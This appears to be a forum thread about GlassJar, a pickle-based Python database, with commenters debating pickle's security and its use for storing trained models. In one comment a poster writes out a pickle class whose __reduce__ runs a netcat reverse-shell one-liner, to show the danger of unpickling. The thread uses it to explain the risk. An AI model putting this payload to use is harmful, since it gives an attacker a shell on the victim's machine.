@@ -1,0 +1,183 @@
+[GlassJar] Stores records as Python objects in the database!
+Hi guys!
+
+I created a pickled-based database for storing Python objects. [GlassJar](https://github.com/furkanonder/glassjar) is a database that, unlike other databases, stores records as Python objects in the database and allows you to use them with ORM.
+
+*Let's look at the small example;*
+
+Normally, we can't directly store the Python dict in a database. But in the [GlassJar](https://github.com/furkanonder/glassjar) we can do that!
+
+    >> from glassjar.model import Model
+    >>>
+    >>> class Item(Model):
+    ...     name: str
+    ...     attrs: dict
+    ...
+    >>> item = Item.records.create(name="item", attrs={"color": "red", "shape":"rectangle"})
+    >>> item.as_dict()
+    {'name': 'item', 'attrs': {'color': 'red', 'shape': 'rectangle'}}
+    >>> item2 = Item.records.create(name="item 2", attrs={"color": "blue", "shape":"triangle"})
+    >>> Item.records.first()
+    Item(name='item', attrs={'color': 'red', 'shape': 'rectangle'})
+    >>> Item.records.last()
+    Item(name='item 2', attrs={'color': 'blue', 'shape': 'triangle'})
+    >>>
+
+Check out our [documentation](https://furkanonder.github.io/glassjar/) to learn more!
+Here's an excerpt from Martin Klepomann's *Designing Data-Intensive Applications*
+
+> Formats for Encoding Data
+>  
+> Language-Specific Formats 
+> 
+> Many programming languages come with built-in support for encoding in-memory objects into byte sequences. For example, Java has java.io.Serializable [1], Ruby has Marshal [2], Python has pickle [3], and so on. Many third-party libraries also exist, such as Kryo for Java [4]. 
+> 
+> These encoding libraries are very convenient, because they allow in-memory objects to be saved and restored with minimal additional code. However, they also have a number of deep problems:
+> 
+> - The encoding is often tied to a particular programming language, and reading the data in another language is very difficult. If you store or transmit data in such an encoding, you are committing yourself to your current programming language for potentially a very long time, and precluding integrating your systems with those of other organizations (which may use different languages).  
+> 
+> - In order to restore data in the same object types, the decoding process needs to be able to instantiate arbitrary classes. This is frequently a source of security problems [5]: if an attacker can get your application to decode an arbitrary byte sequence, they can instantiate arbitrary classes, which in turn often allows them to do terrible things such as remotely executing arbitrary code [6, 7].  
+>
+> - Versioning data is often an afterthought in these libraries: as they are intended for quick and easy encoding of data, they often neglect the inconvenient problems of forward and backward compatibility.  
+> 
+> - Efficiency (CPU time taken to encode or decode, and the size of the encoded structure) is also often an afterthought. For example, Java’s built-in serialization is notorious for its bad performance and bloated encoding [8].  
+> 
+> For these reasons it’s generally a bad idea to use your language’s built-in encoding for anything other than very transient purposes.
+
+You look to be in early stages. Maybe there is time for you to reconsider using Pickle for this.
+please please please tell me this doesnt use marshall or pickle, otherwise this is a major code execution vulnerability
+
+Edit: yep it uses pickle.
+
+Please put a note about the implications of using pickle from a security perspective in the documentation in big bold letters. Pickle is almost never something you want to use from a security perspective and a compatibility perspective...
+
+Pickle as a feature of Python was a mistake (for anything outside super strict usecases which are usually only needed due to other language limitations). In fact, I recall other languages and frameworks like .NET have began deprecating similar features due to their inherent risk and ease of incorrectly using them.
+How is the performance with large datasets? Say you want to store millions or even billions of rows of data...
+At first glance this can't beat zodb or sqlalchemy with mapped relations/json fields
+Are operations atomic? E.g if i start 10 processes simultaneously incrementing a counter 1000 times, will the counter be 10000 at the end?
+Versioning bit me once with this. Was writing a short throw away script and storing objects as pickles. Every time I changed the object I had to scrap the data stored and recreate it.   Only needed the script long enough to write it  debug  , and process some data, but if it was a long term project and every time something changed I had to re-create every entry in a database, it would be a pain.
+I dislike this kind of answer, as it reveals an issue I have come up against time and again, during my 30+ years leading programming teams.
+
+
+
+Martin Klepomann’s context is excellence in programming, no doubt, and if you are creating inventory control for a nuclear power station - may be you do need to consider being able to read that data again in the far future, and if you are in a competitive industry with lots of players - maybe you should be alive to merger and acquisition data migration issues.
+
+These considerations are unlikely to be of concern to a fancy-dress hire shop.  Or a theatre booking office.
+
+An analogous situation is all the mechanics, trained at Internal Combustion University, insisting petrol-drive lawnmowers should be abandoned, because they don’t have seatbelts.
+
+Moreover, graduates form ICU sneering at innovations that don’t meet the gold standard they believe it really stifle innovation.
+
+Glassjar looks great - and I can see many situations where it’s the perfect solution.
+I can equally well see situations where it would be less suitable.
+
+Could we not be kinder, and allow just solutions to exist that fit beautifully into their niche?
+I've seen this before. Why is pickle such a big problem?
+Ok, so now I have to ask something that's eluded me for some time.
+
+Like, what's the use case for pickling?
+
+In my work (if I'm not using an ORM that does it for me) I always *persist* data from an object instance to a data store of some kind (be it SQL, kv store, an API call, flat file, whatever) by writing out the attributes to the store/query and using an ID of some sort as a key; and then when I *hydrate* my data from the data store to an object instance, I just instantiate my class by feeding it the attributes from my queried data.
+
+So I'm not sure what pickling is for, exactly. What am I missing? Why would I want to persist a pickled object to a database in the first place, rather than something like this...
+
+
+```python
+foobar = Foo(id=3, name="this is my foo thing")
+
+persist_query = """
+    INSERT INTO foo
+    (id, name)
+    VALUES ?, ?
+"""
+
+sql_conn.query(persist_query, (foobar.id, foobar.name,))
+sql_cur.commit()
+
+# [... later ...]
+
+hydrate_query = """
+    SELECT id, name
+    FROM foo
+    WHERE id = ?
+"""
+
+saved_foo_dict = sql_conn(hydrate_query, 3).first()
+
+foobar = Foo(**saved_foo_dict)
+```
+I added a warning for the pickle to documentation. Thank you!
+>Pickle as a feature of Python was a mistake (for anything outside super strict usecases which are usually only needed due to other language limitations)
+
+I don't agree with your opinion.  For example, [dill](https://github.com/uqfoundation/dill) and [cloudpickle](https://github.com/cloudpipe/cloudpickle) libraries are very useful libraries that use the pickle module and are well-liked by the community.
+Pickle was designed for internal use mostly, and doesn't have any kind of "control of what happens when I deserialize something" (unpickle). From [the manual](https://docs.python.org/3/library/pickle.html):
+
+> Warning
+>
+> The pickle module is not secure. Only unpickle data you trust.
+>
+> It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
+
+This means, imagine an attacker sends you a specially crafted value. You store this in the DB, thus you serialize (pickle) it. Then, eventually you have to retrieve it to do something with it, so you unserialize it. By doing that, you have executed attackers code, which can remain living in your interpreter, or worst. An example of this can be [found at SO](https://stackoverflow.com/questions/10302247/understanding-python-pickle-insecurity).
+
+If at no point whatever you are pickling/unpickling has been tainted by users, then you can safely use it. Since ensuring this is hard, general recommendation is to simply not use it, and prefer other serialisation techniques that are not prone to code execution.
+Pickle stores executable code. If you unpickle malicious code, you'll end up executing it.
+* https://stackoverflow.com/questions/25353753/python-can-i-safely-unpickle-untrusted-data
+
+* https://github.com/moreati/pickle-fuzz
+Honesty I would argue that you usually never need pickle at all unless you have a really specific reason. Storing datasets can use other safer serialization formats. I have been programming for over a decade, much it in Python, and the only real use case that pickle gives me is that multiprocessing makes use of it in places internally. I have NEVER needed to use it where a better alternative does not already exist. It is very much like SER in Java which is very similar in how it works. It is usually an antipattern to make use of it unless you have exhausted all other options that dont risk arbitrary code execution first.
+
+All pickle really gives you is the ability to retain more complex object relationships and structures without doing some preprocessing first. For things like ML models, other binary structures can and will exist without needing to marshal objects directly into memory like pickle does.
+
+Like, I appreciate data science may make more use of it than any othe field, but I'd still argue that if you have any risk at all of data being untrusted, you shouldn't touch pickle with a barge pole. There are other ways of storing data and relationships between data. Performance wise it is just a downside of how Python works. Other data-driven formats like XML, JSON, CSV, etc are far easier to use cross-platform and between different systems. Likewise you can use binary systems like CBOR, protobuf, etc too. Everything else is merely abstraction over the concepts these data formats provide.
+In data science models are usually pickled for usage in production
+
+Data scientist pickles model -> SWE uses pickle and unpickle to serve predictions
+Just because the community likes it does not mean it encourages best practises and secure code. Far better formats exist that are far more compatible with other systems and do not have the same security implications. Usually there is no "need" to use pickle, it is just chosen because it is easier for the developer at the time.
+
+> Among other things, cloudpickle supports pickling for lambda functions along with functions and classes defined interactively
+
+> dill is quite flexible, and allows arbitrary user defined classes and functions to be serialized.
+
+This is a major security risk. You are transmitting executable code as a feature. If there is any risk whatsoever of someone else ever being able to write to wherever you keep the pickled data, then you have a really big risk.
+
+    class RCE:
+      def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
+        return os.system, (cmd,)
+
+If I pickled this and dropped it onto your system, the simple act of you reading your pickled data would open up a reverse shell that lets me run whatever command I want on your system without you even realising.
+
+I am not saying there are not use cases for pickle and similar formats. I am saying making these easily accessible and in the face of less experienced developers is overly dangerous and encourages their misuse by making them appear to be a quick and simple solution to serialization. Sharing data is fine, but the issue is that it is simple and very easy to accidentally create a remote execution exploit in your applications without realising it. 
+
+Pickle is like having a chainsaw in a high-school woodwork class in an unlocked cabinet, and then telling the students "be careful you dont hurt yourself if you use the chainsaw". In reality, you can argue that you probably do not need a chainsaw to teach highschool woodwork. This is my point, metaphorically.
+
+The fact is, data is data, it just depends how you represent it. There is nothing pickle can do that you could not achieve in one way or another with any other serialization format. The limitation is how you structure the data. Pickle just sends executable instructions as opcodes to construct data, but it still has to either encode the data itself, or instructions to create the data, into the payload. Other formats do this in a far simpler, error proof way, IMHO.
+
+My main point is that using pickle in a normal sort of database is a very deadly path that I'd advise against anyone doing unless they really know what they are doing and the true implications of configuring anything incorrectly and making your computer into a walking network-hosted REPL.
+
+Storing stuff in pickle in a database is no different to storing full executable binaries for programs in a database. Or even just storing pure python scripts in a database.
+
+At the very least, you want to be encrypting and/or signing any pickled data in the database before you unpickle it. Cloudpickle as the example for cluster computing... without signing and security mechanisms at all points of network IO, would cause significant security implications for the HPC cluster. I'd also argue distributed computing on a protocol level is a very specific use case... someone shouldnt be designing a protocol level system for cross-computer code execution without a good knowledge of all the implications and risks. You almost always will use an existing system that does this and has made the relevant considerations already.
+Thank you.
+
+Hmm... is it just a matter of convenience, then? Because wouldn't the developer on the receiving end still have to import the class library first in order to *use* the unpickled object instance? e.g.,
+
+```python
+foobar = unpickle_an_instance_of_Foo()
+
+foobar.do_something()
+
+# NameError: name 'Foo' is not defined
+```
+
+If an object represents attributes and methods, the methods are defined in the class library, and the attributes are populated with data, what's the difference between handing off the pickle, versus instantiating a class with data pulled from a database, in practice?
+
+I'm not trying to be obtuse, I've just never used it, and I'm trying to "get" it. Perhaps there's a use case for me in it somewhere.
+This was a really interesting read, thank you
+The pickled object is a trained data science model. This means the model has learned the relationships in the data. 
+
+You could technically instantiate the model, pull data, then train the model on the pulled data, but this might take anywhere from minutes to days. Depends on model complexity and amount of data. Most models on average where I work take 15-20 minutes to train. But doing all of this at runtime to serve predictions via a rest api… adds a lot of latency.
+Ah, I get it! Thank you.
+Plus, with random seeds, retraining the model doesn’t guarantee the same outputs. If you’re trying to report on the outputs, or make decisions based on them, you don’t want them changing on you. Pickling the model ensures consistency.
